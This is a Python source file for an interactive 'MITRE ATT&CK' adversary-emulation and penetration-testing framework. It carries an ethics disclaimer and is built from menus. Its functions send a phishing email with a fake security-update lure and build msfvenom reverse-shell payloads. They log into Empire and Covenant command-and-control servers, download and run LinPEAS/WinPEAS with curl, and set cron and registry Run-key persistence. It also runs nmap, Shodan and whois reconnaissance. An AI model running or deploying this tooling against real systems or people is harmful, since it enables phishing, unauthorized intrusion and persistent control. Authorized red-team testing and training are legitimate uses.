######################################################################################################################################################################################################################
# Python adversary emulator script, in line with the MITRE ATT&CK Framerwork. Ensuring apt_groups.json is in the same directory as the script. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. 
# Performs simulations or real world attacks based on selections. Note: Will be adding options for real world penatration test attack selection, that will attempt to exploit discovered vulnerabilities based on logic. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import subprocess
import datetime
import json
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

   
# Disclaimer and Ethical Guidelines
def display_disclaimer():
    print("""
    
    DISCLAIMER:
    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
    You must have explicit permission from the owner of any system you target with this script.
    Unauthorized testing and exploitation of systems is illegal and unethical.
    Always ensure you have written consent before conducting any security testing.
    
    """)

# Banner
def print_banner():
    banner = r"""
    
 _____  .___________________________________         _______________________________  _________   ____  __.     ___________                                                  __    
  /     \ |   \__    ___/\______   \_   _____/        /  _  \__    ___/\__    ___/  _ \ \_   ___ \ |    |/ _|     \_   _____/____________     _____   ______  _  _____________|  | __
 /  \ /  \|   | |    |    |       _/|    __)_        /  /_\  \|    |     |    |  >  _ </|    \  \/ |      <        |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
/    Y    \   | |    |    |    |   \|        \      /    |    \    |     |    | /  <_\ \|     \____|    |  \       |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
\____|__  /___| |____|    |____|_  /_______  /______\____|__  /____|     |____| \_____\ \\______  /|____|__ \______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                       \/        \//_____/        \/                         \/       \/         \/_____/    \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
        
       MITRE ATT&CK Simulation & Penetration Testing Framework
    """
    print(banner)


# Check and install dependencies
def install_dependencies():
    dependencies = ["whois", "requests", "dnspython", "shodan", "linkedin-scraper"]
    print("[INFO] Checking dependencies...")
    for dep in dependencies:
        try:
            __import__(dep)
        except ImportError:
            print(f"[INFO] Installing {dep}...")
            subprocess.run(["pip3", "install", dep])
    print("[INFO] Dependencies are installed.")

# Check and clone more_mass.py if not found
def check_more_mass():
    if not os.path.exists("more_mass.py"):
        print("[INFO] Cloning more_mass.py from GitHub...")
        subprocess.run(["git", "clone", "https://github.com/4lph4-01/share.git"])
        subprocess.run(["mv", "share/Automation - Information Gathering/more_mass.py", "./"])
        subprocess.run(["rm", "-rf", "share"])
        print("[INFO] more_mass.py is now available.")

# Initialise framework
def initialize():
    print("[INFO] Initializing framework...")
    install_dependencies()
    check_more_mass()
    print("[INFO] Initialization complete.")

# Run more_mass.py for subdomain enumeration
def run_more_mass():
    domain = input("[INPUT] Enter the target domain for subdomain enumeration: ")
    output_file = f"{domain}_subdomains.txt"
    print(f"[INFO] Running more_mass.py on {domain}...")
    subprocess.run(["python3", "more_mass.py", "-d", domain, "-o", output_file])
    print(f"[INFO] Subdomain enumeration completed. Results saved to {output_file}.")
    return output_file

# Parse output from more_mass.py
def parse_more_mass_output(file_path):
    if not os.path.exists(file_path):
        print("[ERROR] Output file not found.")
        return []
    subdomains = []
    with open(file_path, "r") as file:
        for line in file:
            subdomains.append(line.strip())
    print(f"[INFO] Found {len(subdomains)} subdomains.")
    return subdomains

# Shodan API for asset discovery
def shodan_asset_discovery():
    api_key = input("[INPUT] Enter your Shodan API key: ")
    target = input("[INPUT] Enter the target domain for Shodan asset discovery: ")
    print(f"[INFO] Running Shodan asset discovery on {target}...")
    shodan_url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={target}"
    response = requests.get(shodan_url)
    if response.status_code == 200:
        data = response.json()
        with open(f"{target}_shodan.json", "w") as file:
            json.dump(data, file, indent=4)
        print(f"[INFO] Shodan asset discovery completed. Results saved to {target}_shodan.json.")
    else:
        print("[ERROR] Failed to fetch Shodan data.")

# Function to send a phishing email
def send_phishing_email():
    smtp_server = input("[INPUT] Enter your SMTP server: ")
    smtp_port = input("[INPUT] Enter your SMTP port: ")
    smtp_user = input("[INPUT] Enter your SMTP username: ")
    smtp_pass = input("[INPUT] Enter your SMTP password: ")
    from_email = smtp_user
    to_email = input("[INPUT] Enter the recipient's email address: ")
    subject = "Important Security Update"
    body = """
    Dear User,

    Please review the recent security update by clicking the link below:
    <a href="http://fake-tracking-link.com">Security Update</a>

    Regards,
    IT Security Team
    """

    # Create the email
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_user, smtp_pass)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print("[INFO] Phishing email sent successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

# Function to generate a malicious payload using msfvenom
def generate_payload():
    lhost = input("[INPUT] Enter the LHOST (Local Host IP): ")
    lport = input("[INPUT] Enter the LPORT (Local Host Port): ")
    output_file = input("[INPUT] Enter the output file name (e.g., payload.exe): ")
    payload_type = input("[INPUT] Enter the payload type (e.g., windows/meterpreter/reverse_tcp): ")

    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
    try:
        subprocess.run(command.split(), check=True)
        print(f"[INFO] Payload generated successfully and saved to {output_file}.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to generate payload: {e}")

# Empire interaction
def interact_with_empire():
    empire_url = input("[INPUT] Enter the Empire API URL (e.g., http://localhost:1337): ")
    empire_username = input("[INPUT] Enter your Empire username: ")
    empire_password = input("[INPUT] Enter your Empire password: ")

    # Authenticate with Empire
    auth_url = f"{empire_url}/api/admin/login"
    auth_data = {"username": empire_username, "password": empire_password}
    response = requests.post(auth_url, json=auth_data)

    if response.status_code == 200:
        token = response.json()["token"]
        print("[INFO] Successfully authenticated with Empire.")
    else:
        print("[ERROR] Failed to authenticate with Empire.")
        return

    # Example: Retrieve agents
    headers = {"Authorization": f"Bearer {token}"}
    agents_url = f"{empire_url}/api/agents"
    response = requests.get(agents_url, headers=headers)

    if response.status_code == 200:
        agents = response.json()
        print("[INFO] Retrieved agents from Empire.")
        for agent in agents:
            print(f"Agent: {agent['name']}, Last seen: {agent['lastseen_time']}")
    else:
        print("[ERROR] Failed to retrieve agents from Empire.")

# Covenant interaction
def interact_with_covenant():
    covenant_url = input("[INPUT] Enter the Covenant API URL (e.g., http://localhost:7443): ")
    covenant_username = input("[INPUT] Enter your Covenant username: ")
    covenant_password = input("[INPUT] Enter your Covenant password: ")

    # Authenticate with Covenant
    auth_url = f"{covenant_url}/api/auth/login"
    auth_data = {"username": covenant_username, "password": covenant_password}
    response = requests.post(auth_url, json=auth_data)

    if response.status_code == 200:
        token = response.json()["token"]
        print("[INFO] Successfully authenticated with Covenant.")
    else:
        print("[ERROR] Failed to authenticate with Covenant.")
        return

    # Example: Retrieve grunts (agents)
    headers = {"Authorization": f"Bearer {token}"}
    grunts_url = f"{covenant_url}/api/grunts"
    response = requests.get(grunts_url, headers=headers)

    if response.status_code == 200:
        grunts = response.json()
        print("[INFO] Retrieved grunts from Covenant.")
        for grunt in grunts:
            print(f"Grunt: {grunt['name']}, Last seen: {grunt['lastSeen']}")
    else:
        print("[ERROR] Failed to retrieve grunts from Covenant.")

# Function to run LinPEAS for privilege escalation on Linux
def run_linpeas():
    print("[INFO] Running LinPEAS for privilege escalation on Linux...")
    subprocess.run(["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-o", "linpeas.sh"])
    subprocess.run(["chmod", "+x", "linpeas.sh"])
    subprocess.run(["./linpeas.sh"])

# Function to run WinPEAS for privilege escalation on Windows
def run_winpeas():
    print("[INFO] Running WinPEAS for privilege escalation on Windows...")
    subprocess.run(["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe", "-o", "winPEASx64.exe"])
    subprocess.run(["winPEASx64.exe"])

# Function to add a cron job for persistence on Linux
def add_cron_job():
    command = input("[INPUT] Enter the command to run as a cron job: ")
    cron_entry = f"@reboot {command}"
    with open("mycron", "w") as file:
        file.write(cron_entry + "\n")
    subprocess.run(["crontab", "mycron"])
    os.remove("mycron")
    print("[INFO] Cron job added for persistence.")

# Function to modify registry for persistence on Windows
def add_registry_persistence():
    key = input("[INPUT] Enter the registry key (e.g., 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp'): ")
    value = input("[INPUT] Enter the command or path to executable: ")
    command = f'reg add "{key}" /v MyApp /t REG_SZ /d "{value}" /f'
    subprocess.run(command, shell=True)
    print("[INFO] Registry modified for persistence.")

# Run Nmap for network scanning
def run_nmap():
    target = input("[INPUT] Enter the target IP or domain for Nmap scanning: ")
    output_file = f"{target}_nmap_scan.txt"
    print(f"[INFO] Running Nmap scan on {target}...")
    subprocess.run(["nmap", "-A", target, "-oN", output_file])
    print(f"[INFO] Nmap scan completed. Results saved to {output_file}.")

# Passive Recon (Whois)
def passive_recon():
    target = input("[INPUT] Enter the target domain for passive reconnaissance: ")
    print(f"[INFO] Performing WHOIS lookup on {target}...")
    subprocess.run(["whois", target])

# Vulnerability assessment placeholder
def run_vulnerability_scan():
    print("[INFO] Running vulnerability scan...")
    print("[WARNING] Vulnerability scanning functionality is under development!")

# Generate final report
def generate_report(recon_results):
    report = {
        "timestamp": datetime.datetime.now().isoformat(),
        "reconnaissance": {
            "subdomains": recon_results.get("subdomains", []),
            "nmap_scan": recon_results.get("nmap_scan", "N/A"),
        },
        "vulnerabilities": {
            "assessment": "Vulnerability scan results placeholder",
        },
        "exploitation": {
            "results": "Exploitation results placeholder",
        },
    }

    # Save report as JSON
    with open("report.json", "w") as json_file:
        json.dump(report, json_file, indent=4)
    print("[INFO] Report saved to report.json.")

# Reconnaissance menu
def reconnaissance_menu():
    print("\n[Reconnaissance Menu]")
    print("1. Subdomain Enumeration (via more_mass.py)")
    print("2. Run Nmap for Network Scanning")
    print("3. Passive Recon (Whois)")
    print("4. Shodan Asset Discovery")
    print("0. Back to Main Menu")

    choice = input("[INPUT] Choose an option: ")
    if choice == "1":
        subdomains_file = run_more_mass()
        recon_results["subdomains"] = parse_more_mass_output(subdomains_file)
    elif choice == "2":
        run_nmap()
    elif choice == "3":
        passive_recon()
    elif choice == "4":
        shodan_asset_discovery()
    elif choice == "0":
        return
    else:
        print("[ERROR] Invalid choice. Please try again.")
        reconnaissance_menu()

# Initial Access menu
def initial_access_menu():
    print("\n[Initial Access Menu]")
    print("1. Send Phishing Email")
    print("2. Generate Malicious Payload")
    print("0. Back to Main Menu")

    choice = input("[INPUT] Choose an option: ")
    if choice == "1":
        send_phishing_email()
    elif choice == "2":
        generate_payload()
    elif choice == "0":
        return
    else:
        print("[ERROR] Invalid choice. Please try again.")
        initial_access_menu()

# Exploitation menu
def exploitation_menu():
    print("\n[Exploitation Menu]")
    print("1. Interact with Empire")
    print("2. Interact with Covenant")
    print("0. Back to Main Menu")

    choice = input("[INPUT] Choose an option: ")
    if choice == "1":
        interact_with_empire()
    elif choice == "2":
        interact_with_covenant()
    elif choice == "0":
        return
    else:
        print("[ERROR] Invalid choice. Please try again.")
        exploitation_menu()

# Privilege Escalation & Persistence menu
def privilege_escalation_menu():
    print("\n[Privilege Escalation & Persistence Menu]")
    print("1. Run LinPEAS for Linux Privilege Escalation")
    print("2. Run WinPEAS for Windows Privilege Escalation")
    print("3. Add Cron Job for Persistence (Linux)")
    print("4. Modify Registry for Persistence (Windows)")
    print("0. Back to Main Menu")

    choice = input("[INPUT] Choose an option: ")
    if choice == "1":
        run_linpeas()
    elif choice == "2":
        run_winpeas()
    elif choice == "3":
        add_cron_job()
    elif choice == "4":
        add_registry_persistence()
    elif choice == "0":
        return
    else:
        print("[ERROR] Invalid choice. Please try again.")
        privilege_escalation_menu()

# Main menu
def main_menu():
    while True:
        print("\n[Penetration Testing Framework]")
        print("1. Reconnaissance")
        print("2. Initial Access")
        print("3. Vulnerability Assessment")
        print("4. Exploitation")
        print("5. Privilege Escalation & Persistence")
        print("6. Generate Report")
        print("0. Exit")

        choice = input("[INPUT] Choose an option: ")
        if choice == "1":
            reconnaissance_menu()
        elif choice == "2":
            initial_access_menu()
        elif choice == "3":
            run_vulnerability_scan()
        elif choice == "4":
            exploitation_menu()
        elif choice == "5":
            privilege_escalation_menu()
        elif choice == "6":
            generate_report(recon_results)
        elif choice == "0":
            print("[INFO] Exiting framework. Goodbye!")
            break
        else:
            print("[ERROR] Invalid choice. Please try again.")

# Global dictionary to store results
recon_results = {}

# Initialize and start framework
if __name__ == "__main__":
    initialize()
    main_menu()
